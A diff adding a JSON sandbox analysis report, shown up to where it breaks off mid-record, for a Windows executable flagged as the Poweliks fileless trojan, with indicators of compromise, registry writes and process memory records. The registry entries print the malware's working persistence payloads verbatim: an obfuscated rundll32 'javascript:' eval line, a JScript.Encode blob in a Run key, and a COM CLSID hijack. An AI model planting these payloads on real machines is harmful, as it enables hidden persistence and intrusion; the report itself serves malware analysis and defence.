@@ -1,0 +1,2303 @@
+{
+    "metadata": {
+        "general_details": {
+            "report_created": 1601590910,
+            "sandbox_version": "pilot-d",
+            "sandbox_id": "mtv-work-060"
+        },
+        "malware_desc": [
+            {
+                "sha1": "b024546a49bad1bd60fccef0a5d11b55f9a442c4",
+                "magic": "PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows",
+                "filename": "kwnefkw.exe",
+                "sha256": "b1380fd95bc5c0729738dcda2696aa0a7c6ee97a93d992931ce717a0df523967",
+                "type": "exe",
+                "md5": "b99e0a8c56f963246b6464b9fffbf7a2",
+                "size": 4003840
+            }
+        ],
+        "sandcastle_env": {
+            "analysis_start": 1601590527,
+            "analysis_end": 1601590910,
+            "sample_executed": 1601590578,
+            "current_os": "7601.18798.amd64fre.win7sp1_gdr.150316-1654",
+            "vm_id": "d826d1eec635e7d77c1d9dd7abb0a8e5",
+            "run_time": 300,
+            "sandcastle": "3.5.66.17116.334405ebc-1",
+            "controlsubject": "win7-x64-intel-2020.06.17",
+            "vm": "win7-x64",
+            "display_name": "Windows 7 64-bit",
+            "analysis_features": []
+        }
+    },
+    "iocs": [
+        {
+            "description": "Registry data was seen being written that appears to specify a script command. This is highly unusual as there are many ways to run scripts and commands provided by Windows operating systems, that are less complicated than using the registry. This technique is commonly seen being used by malware, to hide its presence.",
+            "category": [
+                "persistence"
+            ],
+            "tags": [
+                "registry",
+                "persistence",
+                "obfuscation"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": -0.571886419538,
+            "hits": 2,
+            "title": "Possible Registry Script Execution",
+            "orbital-queries": [],
+            "severity": 60,
+            "truncated": false,
+            "confidence": 100,
+            "mitre-techniques": [],
+            "ioc": "potential-registry-script-execution",
+            "mitre-tactics": [],
+            "data": [
+                {
+                    "Process_ID": 3,
+                    "Process_Name": "kwnefkw.exe",
+                    "RegKey_Name": "USER\\S-1-5-21-2580483871-590521980-3826313501-500_CLASSES\\WOW6432NODE\\CLSID\\{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}\\LOCALSERVER32",
+                    "RegKey_Value_Name": "a",
+                    "RegKey_Data": "(new ActiveXObject('WScript.Shell')).Run('C:\\ekjrngjker.exe');s\\\\0"
+                },
+                {
+                    "Process_ID": 3,
+                    "Process_Name": "kwnefkw.exe",
+                    "RegKey_Name": "MACHINE\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN",
+                    "RegKey_Value_Name": "ekjrngjker",
+                    "RegKey_Data": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"epdvnfou/xsjuf)(=tdsjqu!mbohvbhf>ktdsjqu/fodpef?(,)ofx!BdujwfYPckfdu)(XTdsjqu/Tifmm(**/SfhSfbe)(ILDV]]tpguxbsf]]dmbttft]]dmtje]]|bc9:13c5.1:db.5cc7.c89e.b9g6:18:b9e6~]]mpdbmtfswfs43]]b(*,(=0tdsjqu?(*\".replace(/./g,function(_){return%20String.fromCharCode(_.charCodeAt()-1);}))s\\\\0"
+                }
+            ]
+        },
+        {
+            "description": "Number of paragraphs in the header. The program's data begins just after the header, and this field can be used to calculate the appropriate file offset. The header includes the relocation entries. A malicious author could alter the value and cause a parser to crash due to memory misalignment.",
+            "category": [
+                "attribute"
+            ],
+            "tags": [
+                "file",
+                "attributes",
+                "anomaly",
+                "PE"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": -4.11679445946,
+            "hits": 3,
+            "title": "PE DOS Header Size of the Header in Paragraphs Abnormal",
+            "orbital-queries": [],
+            "severity": 5,
+            "truncated": false,
+            "confidence": 60,
+            "mitre-techniques": [
+                "obfuscated files or information"
+            ],
+            "ioc": "pe-dos-header-paragraphs",
+            "mitre-tactics": [
+                "defense evasion"
+            ],
+            "data": [
+                {
+                    "Artifact_ID": 1,
+                    "Path": "kwnefkw.exe",
+                    "Size": 0
+                },
+                {
+                    "Artifact_ID": 5,
+                    "Path": "\\ekjrngjker.exe",
+                    "Size": 0
+                },
+                {
+                    "Artifact_ID": 6,
+                    "Path": "\\TEMP\\kwnefkw.exe",
+                    "Size": 0
+                }
+            ]
+        },
+        {
+            "description": "The TimeDateStamp field is usually set to the build date and time of the PE32 File. While this field is set automatically at link or compiler time, it can easily be modified. Malware will often modify or completely remove this field to hinder forensic investigations into the executable.",
+            "category": [
+                "attribute"
+            ],
+            "tags": [
+                "file",
+                "attributes",
+                "anomaly",
+                "PE"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": -1.31450342589,
+            "hits": 3,
+            "title": "PE COFF Header Timestamp is Not Set",
+            "orbital-queries": [],
+            "severity": 5,
+            "truncated": false,
+            "confidence": 60,
+            "mitre-techniques": [],
+            "ioc": "pe-header-timestamp-null",
+            "mitre-tactics": [],
+            "data": [
+                {
+                    "Artifact_ID": 1,
+                    "Path": "kwnefkw.exe",
+                    "Timestamp": 0
+                },
+                {
+                    "Artifact_ID": 5,
+                    "Path": "\\ekjrngjker.exe",
+                    "Timestamp": 0
+                },
+                {
+                    "Artifact_ID": 6,
+                    "Path": "\\TEMP\\kwnefkw.exe",
+                    "Timestamp": 0
+                }
+            ]
+        },
+        {
+            "description": "A domain which is present in a Cisco Umbrella block list was referenced during the analysis of the sample. Cisco Umbrella is a cloud security platform which provides additional detail about network activity such as security and content categorization for domains. Domains in the Cisco Umbrella block list are typically created to be part of a malware campaign and must reach a certain threshold of malicious activity before Cisco Umbrella will add it to the block list.",
+            "category": [
+                "domain"
+            ],
+            "tags": [
+                "umbrella",
+                "dns",
+                "malicious"
+            ],
+            "suspected-sample-categories": [
+                "domain"
+            ],
+            "heuristic_coefficient": 8.02697494785,
+            "hits": 1,
+            "title": "Domain in Cisco Umbrella Block List",
+            "orbital-queries": [],
+            "severity": 90,
+            "truncated": false,
+            "confidence": 90,
+            "mitre-techniques": [],
+            "ioc": "network-opendns-malicious",
+            "mitre-tactics": [],
+            "data": [
+                {
+                    "Domain": "retdemos.com",
+                    "Categories": [],
+                    "Security": [
+                        "Malware"
+                    ]
+                }
+            ]
+        },
+        {
+            "description": "Some malware applications write code into areas of memory intended for data (such as a thread's stack) and then the application executes the malicious code. Windows introduced Data Execution Prevention (DEP) which provided protection against this type of attack. If an attempt to execute code is made in a page that does not have the PAGE_EXECUTE_ protection, an access violation will occur. Malware will often allocate memory in which it will inject code. In order to bypass DEP the allocated memory must be marked Read, Write and Execute. The submitted sample allocated a memory region with the flag PAGE_EXECUTE_READWRITE. This could indicate the presence of code injection, into itself or a remote process.",
+            "category": [
+                "code-injection"
+            ],
+            "tags": [
+                "memory"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": 1.39305108584,
+            "hits": 2,
+            "title": "Potential Code Injection Detected",
+            "orbital-queries": [],
+            "severity": 50,
+            "truncated": false,
+            "confidence": 50,
+            "mitre-techniques": [
+                "process injection",
+                "extra window memory injection"
+            ],
+            "ioc": "memory-execute-readwrite",
+            "mitre-tactics": [
+                "defense evasion",
+                "privilege escalation"
+            ],
+            "data": [
+                {
+                    "Process_ID": 3,
+                    "Address": 2003435520,
+                    "Process_Name": "kwnefkw.exe"
+                },
+                {
+                    "Process_ID": 3,
+                    "Address": 2002255872,
+                    "Process_Name": "kwnefkw.exe"
+                }
+            ]
+        },
+        {
+            "description": "Malware will modify executables on a system, to hide logs or other evidence. Also, by modifying various executables it can disable functionality in the system which may detect or hamper the operation of the malware. Lastly, it may be attempting to hide an executable, so that it appears to be a legitimate file. Please review the 'Disk Artifacts' section in order to view additional details about this file.",
+            "category": [
+                "dynamic-anomaly"
+            ],
+            "tags": [
+                "executable",
+                "file",
+                "process",
+                "PE"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": 0.586961835098,
+            "hits": 1,
+            "title": "Process Modified an Executable File",
+            "orbital-queries": [],
+            "severity": 60,
+            "truncated": false,
+            "confidence": 100,
+            "mitre-techniques": [],
+            "ioc": "modified-executable",
+            "mitre-tactics": [],
+            "data": [
+                {
+                    "Process_ID": 3,
+                    "Process_Name": "kwnefkw.exe",
+                    "Path": "\\ekjrngjker.exe"
+                }
+            ]
+        },
+        {
+            "description": "This word contains the absolute value that must be loaded into the SP register before the program is given control. Since the actual stack segment is determined by the loader, and this is merely a value within that segment, it does not need to be relocated. This value can be used by a malicious author to alter the Stack Pointer and access the data that is pointed to by that address.",
+            "category": [
+                "attribute"
+            ],
+            "tags": [
+                "file",
+                "attributes",
+                "anomaly",
+                "PE"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": 3.11607698263,
+            "hits": 3,
+            "title": "PE DOS Header Initial SP Value is Abnormal",
+            "orbital-queries": [],
+            "severity": 5,
+            "truncated": false,
+            "confidence": 60,
+            "mitre-techniques": [
+                "obfuscated files or information"
+            ],
+            "ioc": "pe-dos-header-initialsp",
+            "mitre-tactics": [
+                "defense evasion"
+            ],
+            "data": [
+                {
+                    "Artifact_ID": 1,
+                    "Path": "kwnefkw.exe",
+                    "Initial_SP": 139
+                },
+                {
+                    "Artifact_ID": 5,
+                    "Path": "\\ekjrngjker.exe",
+                    "Initial_SP": 139
+                },
+                {
+                    "Artifact_ID": 6,
+                    "Path": "\\TEMP\\kwnefkw.exe",
+                    "Initial_SP": 139
+                }
+            ]
+        },
+        {
+            "description": "A COM Class Object Identifier (CLSID) was seen being created and executed. Among their many uses CLSIDs can define behaviour for the program reading them, up to and including what code to execute or what remote host to read download data from. Seeing a CLSID on the command line is rare and is typically limited to system utilities running CLSIDs built into Windows. The fact that a new CLSID was both created and executed is highly suspicious.",
+            "category": [
+                "pattern"
+            ],
+            "tags": [
+                "registry",
+                "process",
+                "persistence",
+                "evasion"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": 6.49985177412,
+            "hits": 1,
+            "title": "CLSID Created And Executed",
+            "orbital-queries": [],
+            "severity": 80,
+            "truncated": false,
+            "confidence": 100,
+            "mitre-techniques": [
+                "component object model hijacking"
+            ],
+            "ioc": "registry-clsid-create-execute",
+            "mitre-tactics": [
+                "persistence",
+                "defense evasion"
+            ],
+            "data": [
+                {
+                    "Process_ID": 31,
+                    "Process_Name": "DllHost.exe",
+                    "CLSID": "{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+                    "Command_Line": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}"
+                }
+            ]
+        },
+        {
+            "description": "The TimeDateStamp field is usually set to the build date and time of the PE32 File. While this field is set automatically at link or compiler time, it can easily be modified. Malware will often modify or completely remove this field to hinder forensic investigations into the executable.",
+            "category": [
+                "attribute"
+            ],
+            "tags": [
+                "file",
+                "attributes",
+                "anomaly",
+                "PE"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": 0.183177798301,
+            "hits": 3,
+            "title": "PE COFF Header Timestamp is Set to Date Prior to 1999",
+            "orbital-queries": [],
+            "severity": 5,
+            "truncated": false,
+            "confidence": 60,
+            "mitre-techniques": [],
+            "ioc": "pe-header-timestamp-prior",
+            "mitre-tactics": [],
+            "data": [
+                {
+                    "Artifact_ID": 1,
+                    "Path": "kwnefkw.exe",
+                    "Timestamp": 0
+                },
+                {
+                    "Artifact_ID": 5,
+                    "Path": "\\ekjrngjker.exe",
+                    "Timestamp": 0
+                },
+                {
+                    "Artifact_ID": 6,
+                    "Path": "\\TEMP\\kwnefkw.exe",
+                    "Timestamp": 0
+                }
+            ]
+        },
+        {
+            "description": "This word gives the number of entries that exist in the relocation pointer table. It is quite in order for this value to be zero, in which case there are no relocation entries.",
+            "category": [
+                "attribute"
+            ],
+            "tags": [
+                "file",
+                "attributes",
+                "anomaly",
+                "PE"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": 1.83209348177,
+            "hits": 3,
+            "title": "PE DOS Header Number of Relocations Was Abnormal",
+            "orbital-queries": [],
+            "severity": 5,
+            "truncated": false,
+            "confidence": 60,
+            "mitre-techniques": [
+                "obfuscated files or information"
+            ],
+            "ioc": "pe-dos-header-relocations",
+            "mitre-tactics": [
+                "defense evasion"
+            ],
+            "data": [
+                {
+                    "Artifact_ID": 1,
+                    "Path": "kwnefkw.exe",
+                    "Relocations": 4
+                },
+                {
+                    "Artifact_ID": 5,
+                    "Path": "\\ekjrngjker.exe",
+                    "Relocations": 4
+                },
+                {
+                    "Artifact_ID": 6,
+                    "Path": "\\TEMP\\kwnefkw.exe",
+                    "Relocations": 4
+                }
+            ]
+        },
+        {
+            "description": "Autorun registry keys can be used to load applications when Windows is started. Malware often uses these key locations to maintain persistence on the host. The values to examine are located in subkeys Run, RunOnce, RunServices, RunServicesOnce, RunOnceEx, or RunOnce\\Setup. The key value will indicate where the program that will load on startup is located.",
+            "category": [
+                "persistence"
+            ],
+            "tags": [
+                "process",
+                "autorun",
+                "registry"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": 1.9766273776,
+            "hits": 2,
+            "title": "Process Modified Autorun Registry Key Value",
+            "orbital-queries": [
+                {
+                    "query-id": "registry_parameterized_search",
+                    "params": {
+                        "reg_key_name": "RegKey_Name",
+                        "reg_key_value": "RegKey_Value_Name"
+                    },
+                    "values": [
+                        {
+                            "reg_key_name": "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN",
+                            "reg_key_value": "b"
+                        },
+                        {
+                            "reg_key_name": "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN",
+                            "reg_key_value": "ekjrngjker"
+                        }
+                    ]
+                }
+            ],
+            "severity": 80,
+            "truncated": false,
+            "confidence": 60,
+            "mitre-techniques": [
+                "registry run keys / startup folder"
+            ],
+            "ioc": "registry-autorun-key-modified",
+            "mitre-tactics": [
+                "persistence"
+            ],
+            "data": [
+                {
+                    "Process_ID": 3,
+                    "Process_Name": "kwnefkw.exe",
+                    "RegKey_Name": "MACHINE\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN",
+                    "RegKey_Value_Name": "b",
+                    "RegKey_Data_Type": "SZ",
+                    "RegKey_Data": "#@~^7H0AAA==n{F+2im'xs\\\\127h,)mDk-+or8%s\\\\127mYvEs\\\\127UmDb2ORUts\\\\127VsJbIStrVs\\\\127c+e'*+*s\\\\9Y.zPhxlc3XwCs\\\\9NAx\\bDKU:s\\\\127xs\\\\0"
+                },
+                {
+                    "Process_ID": 3,
+                    "Process_Name": "kwnefkw.exe",
+                    "RegKey_Name": "MACHINE\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN",
+                    "RegKey_Value_Name": "ekjrngjker",
+                    "RegKey_Data_Type": "SZ",
+                    "RegKey_Data": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"epdvnfou/xsjuf)(=tdsjqu!mbohvbhf>ktdsjqu/fodpef?(,)ofx!BdujwfYPckfdu)(XTdsjqu/Tifmm(**/SfhSfbe)(ILDV]]tpguxbsf]]dmbttft]]dmtje]]|bc9:13c5.1:db.5cc7.c89e.b9g6:18:b9e6~]]mpdbmtfswfs43]]b(*,(=0tdsjqu?(*\".replace(/./g,function(_){return%20String.fromCharCode(_.charCodeAt()-1);}))s\\\\0"
+                }
+            ]
+        },
+        {
+            "description": "Poweliks is a trojan that does not require a file present on the victim's system. Instead, it relies on JavaScript embedded in the registry to store and launch itself. Once launched, the trojan checks for the presence of certain tools, such as PowerShell or .NET and may download them from a Microsoft server if they are not found. It also reaches out to its command and control server for further instructions and to download additional tools or malware. Poweliks first appeared in the summer of 2014.",
+            "category": [
+                "trojan"
+            ],
+            "tags": [
+                "trojan",
+                "host",
+                "registry"
+            ],
+            "suspected-sample-categories": [
+                "trojan"
+            ],
+            "heuristic_coefficient": 0.0,
+            "hits": 1,
+            "title": "Poweliks Detected",
+            "orbital-queries": [],
+            "severity": 100,
+            "truncated": false,
+            "confidence": 100,
+            "mitre-techniques": [],
+            "ioc": "malware-trojan-poweliks",
+            "mitre-tactics": [],
+            "data": [
+                {
+                    "RegKey_Data": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"epdvnfou/xsjuf)(=tdsjqu!mbohvbhf>ktdsjqu/fodpef?(,)ofx!BdujwfYPckfdu)(XTdsjqu/Tifmm(**/SfhSfbe)(ILDV]]tpguxbsf]]dmbttft]]dmtje]]|bc9:13c5.1:db.5cc7.c89e.b9g6:18:b9e6~]]mpdbmtfswfs43]]b(*,(=0tdsjqu?(*\".replace(/./g,function(_){return%20String.fromCharCode(_.charCodeAt()-1);}))s\\\\0",
+                    "RegKey_Name": "MACHINE\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN",
+                    "Process_Name": "kwnefkw.exe",
+                    "Process_ID": 3
+                }
+            ]
+        },
+        {
+            "description": "An excessive number of DNS queries detected. Malware will generally attempt to make contact with its command and control infrastructure when it is first executed. Malware that makes use of domain generation algorithms will often query a large number of domains looking for an active command and control server. In addition, adware and potentially unwanted applications often attempt to resolve a large number of domains.",
+            "category": [
+                "domain"
+            ],
+            "tags": [
+                "communication",
+                "dns",
+                "threshold"
+            ],
+            "suspected-sample-categories": [
+                "domain"
+            ],
+            "heuristic_coefficient": -0.289189498727,
+            "hits": 1,
+            "title": "Excessive Number of DNS Queries",
+            "orbital-queries": [],
+            "severity": 70,
+            "truncated": false,
+            "confidence": 100,
+            "mitre-techniques": [
+                "fallback channels"
+            ],
+            "ioc": "dns-excessive-domain-queries",
+            "mitre-tactics": [
+                "command and control"
+            ],
+            "data": [
+                {}
+            ]
+        },
+        {
+            "description": "A process modified Internet Explorer's Toolbar Lock setting. When the toolbar is locked users cannot re-position the bars and buttons or make hidden buttons visible. Malware may modify this registry key to prevent users from modifying the toolbar.",
+            "category": [
+                "weakening"
+            ],
+            "tags": [
+                "registry",
+                "obfuscation",
+                "browser"
+            ],
+            "suspected-sample-categories": [
+                "weakening"
+            ],
+            "heuristic_coefficient": 0.0,
+            "hits": 1,
+            "title": "Process Locked Internet Explorer's Toolbar",
+            "orbital-queries": [],
+            "severity": 60,
+            "truncated": false,
+            "confidence": 100,
+            "mitre-techniques": [
+                "man in the browser"
+            ],
+            "ioc": "registry-ie-lock-toolbar",
+            "mitre-tactics": [
+                "collection"
+            ],
+            "data": [
+                {
+                    "Process_ID": 15,
+                    "Process_Name": "Explorer.EXE",
+                    "RegKey_Name": "USER\\S-1-5-21-2580483871-590521980-3826313501-500\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\TOOLBAR",
+                    "RegKey_Value_Name": "Locked",
+                    "RegKey_Data": "1"
+                }
+            ]
+        },
+        {
+            "description": "A static analysis rule identified an artifact that has one or more anomalous characteristics. These anomalies may exist due to flaws in the file generation or misunderstandings of the format. Malware may use file anomalies to confuse antivirus parsers and hide code in unusual locations.",
+            "category": [
+                "static-anomaly"
+            ],
+            "tags": [
+                "anomaly",
+                "static"
+            ],
+            "suspected-sample-categories": [],
+            "heuristic_coefficient": 0.220321804969,
+            "hits": 6,
+            "title": "Static Analysis Flagged Artifact As Anomalous",
+            "orbital-queries": [],
+            "severity": 60,
+            "truncated": false,
+            "confidence": 80,
+            "mitre-techniques": [
+                "obfuscated files or information"
+            ],
+            "ioc": "artifact-flagged-anomaly",
+            "mitre-tactics": [
+                "defense evasion"
+            ],
+            "data": [
+                {
+                    "Artifact_ID": 5,
+                    "SHA256": "b1380fd95bc5c0729738dcda2696aa0a7c6ee97a93d992931ce717a0df523967",
+                    "Path": "\\ekjrngjker.exe",
+                    "Rule": "pe_registry_autorun",
+                    "Description": "Binary contains a registry path for an autorun key."
+                },
+                {
+                    "Artifact_ID": 6,
+                    "SHA256": "b1380fd95bc5c0729738dcda2696aa0a7c6ee97a93d992931ce717a0df523967",
+                    "Path": "\\TEMP\\kwnefkw.exe",
+                    "Rule": "pe_registry_autorun",
+                    "Description": "Binary contains a registry path for an autorun key."
+                },
+                {
+                    "Artifact_ID": 1,
+                    "SHA256": "b1380fd95bc5c0729738dcda2696aa0a7c6ee97a93d992931ce717a0df523967",
+                    "Path": "kwnefkw.exe",
+                    "Rule": "pe_registry_autorun",
+                    "Description": "Binary contains a registry path for an autorun key."
+                },
+                {
+                    "Artifact_ID": 5,
+                    "SHA256": "b1380fd95bc5c0729738dcda2696aa0a7c6ee97a93d992931ce717a0df523967",
+                    "Path": "\\ekjrngjker.exe",
+                    "Rule": "pe_create_tool",
+                    "Description": "PE references CreateToolhelp32Snapshot without import."
+                },
+                {
+                    "Artifact_ID": 6,
+                    "SHA256": "b1380fd95bc5c0729738dcda2696aa0a7c6ee97a93d992931ce717a0df523967",
+                    "Path": "\\TEMP\\kwnefkw.exe",
+                    "Rule": "pe_create_tool",
+                    "Description": "PE references CreateToolhelp32Snapshot without import."
+                },
+                {
+                    "Artifact_ID": 1,
+                    "SHA256": "b1380fd95bc5c0729738dcda2696aa0a7c6ee97a93d992931ce717a0df523967",
+                    "Path": "kwnefkw.exe",
+                    "Rule": "pe_create_tool",
+                    "Description": "PE references CreateToolhelp32Snapshot without import."
+                }
+            ]
+        }
+    ],
+    "dynamic": {
+        "processes": {
+            "10": {
+                "pid": 444,
+                "process_name": "lsass.exe",
+                "ppid": null,
+                "kpid": "0xfffffa8002a8f270",
+                "new": false,
+                "monitored": true,
+                "time": "Thu, 01 Oct 2020 22:16:19 UTC",
+                "files_modified": [
+                    "\\PC*\\MAILSLOT\\NET\\NETLOGON",
+                    "\\lsass"
+                ],
+                "files_read": [
+                    "\\lsass"
+                ],
+                "memory": [
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002a8f270",
+                        "protect": [
+                            "PAGE_GUARD",
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x631000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x630000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002a8f270",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x3d7000"
+                            }
+                        ]
+                    }
+                ],
+                "parent": "",
+                "proc": false,
+                "startup_info": {
+                    "shell_info": "C:\\Windows\\system32\\lsass.exe",
+                    "current_directory": "C:\\Windows\\system32\\",
+                    "command_line": "C:\\Windows\\system32\\lsass.exe",
+                    "upid": 444,
+                    "uthread": 0,
+                    "image_pathname": "C:\\Windows\\system32\\lsass.exe",
+                    "dll_path": "C:\\Windows\\system32;C:\\Windows\\system32;C:\\Windows\\system;C:\\Windows;.;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+                    "runtime_data": "",
+                    "tid": "0xfffffa8002b99080",
+                    "window_title": "C:\\Windows\\system32\\lsass.exe",
+                    "incomplete": false
+                },
+                "analyzed_because": "Process activity after target sample started."
+            },
+            "12": {
+                "pid": 548,
+                "process_name": "svchost.exe",
+                "ppid": null,
+                "kpid": "0xfffffa8002ae0b30",
+                "new": false,
+                "monitored": true,
+                "time": "Thu, 01 Oct 2020 22:16:19 UTC",
+                "memory": [
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002ae0b30",
+                        "protect": [
+                            "PAGE_GUARD",
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x14d5000"
+                            },
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x14d4000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002ae0b30",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT",
+                            "MEM_RESERVE"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x20000",
+                                "base_address": "0x0"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002ae0b30",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_RESERVE"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x100000",
+                                "base_address": "0x1c0000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002ae0b30",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0xb000",
+                                "base_address": "0x2b5000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0x39c",
+                        "zero_bits": 0,
+                        "process": "0x00000000",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x58",
+                                "base_address": "0x0"
+                            }
+                        ]
+                    }
+                ],
+                "parent": "",
+                "proc": false,
+                "startup_info": {
+                    "shell_info": "",
+                    "current_directory": "C:\\Windows\\system32\\",
+                    "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+                    "upid": 548,
+                    "uthread": 0,
+                    "image_pathname": "C:\\Windows\\system32\\svchost.exe",
+                    "dll_path": "C:\\Windows\\system32;C:\\Windows\\system32;C:\\Windows\\system;C:\\Windows;.;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+                    "runtime_data": "",
+                    "tid": "0xfffffa8002bf0080",
+                    "window_title": "C:\\Windows\\system32\\svchost.exe",
+                    "incomplete": false
+                },
+                "analyzed_because": "Process activity after target sample started.",
+                "children": [
+                    "31"
+                ]
+            },
+            "13": {
+                "pid": 244,
+                "process_name": "svchost.exe",
+                "ppid": null,
+                "kpid": "0xfffffa8002bb9b30",
+                "new": false,
+                "monitored": true,
+                "time": "Thu, 01 Oct 2020 22:16:19 UTC",
+                "files_checked": [
+                    "\\Windows\\system32\\drivers\\etc\\hosts.ics"
+                ],
+                "files_modified": [
+                    "\\wkssvc"
+                ],
+                "files_read": [
+                    "\\Windows\\System32\\drivers\\etc\\hosts",
+                    "\\wkssvc"
+                ],
+                "memory": [
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002bb9b30",
+                        "protect": [
+                            "PAGE_GUARD",
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x2000",
+                                "base_address": "0x2b14000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002bb9b30",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_RESERVE"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0xc0000",
+                                "base_address": "0x0"
+                            },
+                            {
+                                "size": "0x80000",
+                                "base_address": "0x2c40000"
+                            }
+                        ]
+                    },
+                    {
+                        "process_handle": "0xffffffff",
+                        "zero_bits": 0,
+                        "process": "0xfffffa8002bb9b30",
+                        "protect": [
+                            "PAGE_READWRITE"
+                        ],
+                        "allocation_type": [
+                            "MEM_COMMIT"
+                        ],
+                        "entry": [
+                            {
+                                "size": "0x4000",
+                                "base_address": "0x2ce0000"
+                            },
+                            {
+                                "size": "0x11000",
+                                "base_address": "0xd97000"
+                            },
+                            {
+                                "size": "0xa000",
+                                "base_address": "0x2cb6000"
+                            }
+                        ]
+                    }
+                ],
+                "parent": "",
+                "proc": false,
+                "sockets": [
+                    {
+                        "file_handle": "0x33c",
+                        "protocol": "0",
+                        "state": 1,
+                        "states": [
+                            "BIND"
+                        ],
+                        "timestamp": 1601590585.4141335,
+                        "src_ip": "0.0.0.0",
+                        "src_port": 57814
+                    }
+                ],
+                "startup_info": {
+                    "shell_info": "",
+                    "current_directory": "C:\\Windows\\system32\\",
+                    "command_line": "C:\\Windows\\system32\\svchost.exe -k NetworkService",
+                    "upid": 244,
+                    "uthread": 0,
+                    "image_pathname": "C:\\Windows\\system32\\svchost.exe",
+                    "dll_path": "C:\\Windows\\system32;C:\\Windows\\system32;C:\\Windows\\system;C:\\Windows;.;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\",
+                    "runtime_data": "",
+                    "tid": "0xfffffa8002ad6b50",
+                    "window_title": "C:\\Windows\\system32\\svchost.exe",
+                    "incomplete": false
+                },
+                "threads": [
+                    {
+                        "client_id": 8397322214375721000,
+                        "create_suspended": "0x1",
+                        "process": "0x00000000",
+                        "process_handle": "0x80000384",
+                        "return": 0,
+                        "thread": "0x00000000"
+                    }
+                ],
+                "analyzed_because": "Process activity after target sample started."
+            },
+            "14": {
+                "pid": 1616,
